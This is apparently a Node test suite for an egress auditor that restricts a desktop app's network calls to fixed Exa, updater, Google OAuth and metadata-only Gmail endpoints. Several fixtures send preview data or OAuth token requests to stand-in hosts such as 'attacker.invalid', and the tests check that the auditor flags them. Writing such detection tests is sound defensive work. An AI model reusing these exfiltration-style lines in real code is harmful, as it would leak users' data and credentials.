import assert from "node:assert/strict";
import test from "node:test";
import { auditTelemetrySource } from "./audit-telemetry-egress.mjs";

test("accepts a compile-time bounded primitive diagnostic projection", () => {
  assert.deepEqual(
    auditTelemetrySource(
      `
        export const diagnosticFieldAllowlist = ["component", "code", "retriable"] as const;
        const preview = { component: input.component, code: input.code, retriable: input.retriable };
        const upload = "DISABLED";
      `,
      "crash-reporting.ts",
    ),
    [],
  );
});

test("rejects outbound transports, forbidden page-derived fields and dynamic projections", () => {
  const errors = auditTelemetrySource(
    `
      const preview = { ...input, [input.key]: input.value, pageUrl: input.url };
      fetch("https://telemetry.invalid", { body: JSON.stringify(preview) });
    `,
    "crash-reporting.ts",
  );
  assert.ok(errors.some((error) => error.includes("outbound transport")));
  assert.ok(errors.some((error) => error.includes("page-derived field")));
  assert.ok(errors.some((error) => error.includes("dynamic projection")));
});

test("rejects Electron native crash collection even when uploads are disabled", () => {
  const errors = auditTelemetrySource(
    `
      import { crashReporter as collector } from "electron";
      collector.start({ uploadToServer: false });
    `,
    "apps/desktop/src/main/runtime.ts",
  );
  assert.ok(errors.some((error) => error.includes("native crash collection")));
});

test("allows only the fixed Exa research egress contract", () => {
  const file = "apps/desktop/src/research/exa-search-provider.ts";
  assert.deepEqual(
    auditTelemetrySource(
      `
        const EXA_SEARCH_ENDPOINT = "https://api.exa.ai/search";
        const request = globalThis.fetch;
        response = await this.request(EXA_SEARCH_ENDPOINT, {});
      `,
      file,
    ),
    [],
  );
  assert.ok(
    auditTelemetrySource(
      `
        const EXA_SEARCH_ENDPOINT = "https://attacker.invalid";
        const request = globalThis.fetch;
        response = await this.request(EXA_SEARCH_ENDPOINT, {});
      `,
      file,
    ).some((error) => error.includes("fixed Exa egress contract")),
  );
});

test("allows only the updater's policy-gated fetch seam", () => {
  const file = "apps/desktop/src/main/update-runtime.ts";
  assert.deepEqual(
    auditTelemetrySource(
      `
        export function desktopUpdateFetch(input, init) {
          return globalThis.fetch(input, init);
        }
        const manifestResponse = await beginTimedFetch(
          this.dependencies.fetch,
          this.dependencies.policy.endpoint,
          "application/json",
          "MANIFEST_UNAVAILABLE",
        );
        prevalidateManifest(policy, currentVersion, manifest, manifestUrl);
        const artifactResponse = await beginTimedFetch(
          this.dependencies.fetch,
          manifest.artifactUrl,
          "application/zip",
          "ARTIFACT_UNAVAILABLE",
        );
      `,
      file,
    ),
    [],
  );
  assert.ok(
    auditTelemetrySource(
      `export const desktopUpdateFetch = globalThis.fetch;`,
      file,
    ).some((error) => error.includes("policy-gated updater egress contract")),
  );
});

test("allows only fixed Google OAuth and metadata-only Gmail egress", () => {
  const oauthFile = "apps/desktop/src/gmail/gmail-oauth-controller.ts";
  const oauthSource = `
    const AUTHORIZE_ENDPOINT = "https://accounts.google.com/o/oauth2/v2/auth";
    const TOKEN_ENDPOINT = "https://oauth2.googleapis.com/token";
    const REVOKE_ENDPOINT = "https://oauth2.googleapis.com/revoke";
    const PROFILE_ENDPOINT = "https://gmail.googleapis.com/gmail/v1/users/me/profile";
    this.request = dependencies.fetch ?? globalThis.fetch;
    await bestEffortRequestWithTimeout(this.request, REVOKE_ENDPOINT, {});
    await this.request(TOKEN_ENDPOINT, {});
    await this.request(PROFILE_ENDPOINT, {});
    await this.request(TOKEN_ENDPOINT, {});
  `;
  assert.deepEqual(auditTelemetrySource(oauthSource, oauthFile), []);
  assert.ok(
    auditTelemetrySource(
      oauthSource.replace("oauth2.googleapis.com/token", "attacker.invalid"),
      oauthFile,
    ).some((error) => error.includes("fixed Google OAuth")),
  );
  assert.ok(
    auditTelemetrySource(`${oauthSource}\nfetch(ownerUrl);`, oauthFile).some(
      (error) => error.includes("fixed Google OAuth"),
    ),
  );
  assert.ok(
    auditTelemetrySource(
      `${oauthSource}\nawait this.request("https://attacker.invalid", {});`,
      oauthFile,
    ).some((error) => error.includes("fixed Google OAuth")),
  );

  const metadataFile = "apps/desktop/src/gmail/gmail-metadata-provider.ts";
  const metadataSource = `
    const GMAIL_API = "https://gmail.googleapis.com/gmail/v1/users/me";
    this.request = dependencies.fetch ?? globalThis.fetch;
    const listUrl = new URL(\`${"${GMAIL_API}"}/messages\`);
    listUrl.searchParams.set("fields", "messages/id");
    const url = new URL(\`${"${GMAIL_API}"}/messages/${"${encodeURIComponent(id)}"}\`);
    url.searchParams.set("format", "METADATA");
    url.searchParams.set("fields", "id,labelIds,internalDate,payload/headers");
    await this.request(url, {});
  `;
  assert.deepEqual(auditTelemetrySource(metadataSource, metadataFile), []);
  assert.ok(
    auditTelemetrySource(
      metadataSource.replace('"METADATA"', '"FULL"'),
      metadataFile,
    ).some((error) => error.includes("metadata-only Gmail API")),
  );
  assert.ok(
    auditTelemetrySource(
      `${metadataSource}\nlistUrl.searchParams.set("q", ownerInput);`,
      metadataFile,
    ).some((error) => error.includes("metadata-only Gmail API")),
  );
  assert.ok(
    auditTelemetrySource(
      `${metadataSource}\nglobalThis.fetch(ownerUrl);`,
      metadataFile,
    ).some((error) => error.includes("metadata-only Gmail API")),
  );
  assert.ok(
    auditTelemetrySource(
      `${metadataSource}\nurl.searchParams.set("fields", "payload/body");`,
      metadataFile,
    ).some((error) => error.includes("metadata-only Gmail API")),
  );
});
